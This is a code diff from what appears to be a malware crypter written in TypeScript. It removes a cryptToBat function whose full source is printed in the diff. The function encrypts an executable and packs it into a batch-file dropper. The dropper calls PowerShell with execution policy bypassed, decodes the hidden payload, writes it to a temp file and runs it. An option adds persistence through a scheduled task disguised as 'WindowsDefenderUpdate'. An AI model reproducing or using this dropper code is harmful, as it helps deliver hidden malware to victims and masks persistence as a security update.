@@ -2,7 +2,6 @@ import zlib from "zlib";
 import fs from "fs";
 import path from "path";
 import { $ } from "bun";
-import { v4 as uuidv4 } from "uuid";
 
 export interface CryptOpts {
   dualHooked: boolean;
@@ -246,64 +245,3 @@ ${dualCode}
   }
 }
 
-// ── EXE → BAT (PowerShell dropper self-contained in .bat) ────────────────────
-
-export async function cryptToBat(
-  exe: Buffer,
-  out: string,
-  opts: CryptOpts
-): Promise<void> {
-  const gz = zlib.gzipSync(exe, { level: 9 });
-  const key = randKey();
-  const enc = xorBuf(gz, key);
-  const b64 = enc.toString("base64");
-  // Split into 76-char lines so the marker search stays fast
-  const b64Lines = (b64.match(/.{1,76}/g) ?? [b64]).join("\n");
-
-  // Unique marker embedded as a BAT label (never executed — we exit /b 0 before it)
-  const marker = `:PAYLOAD_${uuidv4().replace(/-/g, "").substring(0, 16).toUpperCase()}`;
-
-  const dualHookPs = opts.dualHooked
-    ? [
-        `$a=New-ScheduledTaskAction -Execute $t;`,
-        `$tr=New-ScheduledTaskTrigger -AtLogOn;`,
-        `Register-ScheduledTask -Force -TaskName 'WindowsDefenderUpdate' -Action $a -Trigger $tr -RunLevel Highest 2>$null;`,
-      ].join("")
-    : "";
-
-  // PowerShell inline: reads THIS bat file to extract payload after the marker
-  const psCmd = [
-    `$k=${key};`,
-    `$l=[IO.File]::ReadAllLines($env:_SELF);`,
-    // Find marker line, grab everything after it as base64
-    `$i=0;for($j=0;$j-lt$l.Count;$j++){if($l[$j] -ceq '${marker}'){$i=$j+1;break}};`,
-    `$b=[Convert]::FromBase64String(($l[$i..($l.Count-1)] -join ''));`,
-    // XOR decrypt
-    `$d=New-Object byte[] $b.Length;`,
-    `for($x=0;$x-lt$b.Length;$x++){$d[$x]=$b[$x] -bxor $k};`,
-    // Gzip decompress
-    `$ms=New-Object IO.MemoryStream(,$d);`,
-    `$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);`,
-    `$os=New-Object IO.MemoryStream;$gs.CopyTo($os);$gs.Close();`,
-    // Write + run
-    `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString()+'.exe');`,
-    `[IO.File]::WriteAllBytes($t,$os.ToArray());`,
-    dualHookPs,
-    `Start-Process $t;`,
-  ].join("");
-
-  const bat = [
-    "@echo off",
-    "setlocal",
-    `set "_SELF=%~f0"`,
-    // Single-line PS command reads env:_SELF to locate payload in this file
-    `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "${psCmd}"`,
-    "endlocal",
-    "exit /b 0",
-    // --- payload data below (never executed by BAT) ---
-    marker,
-    b64Lines,
-  ].join("\r\n");
-
-  fs.writeFileSync(out, bat);
-}
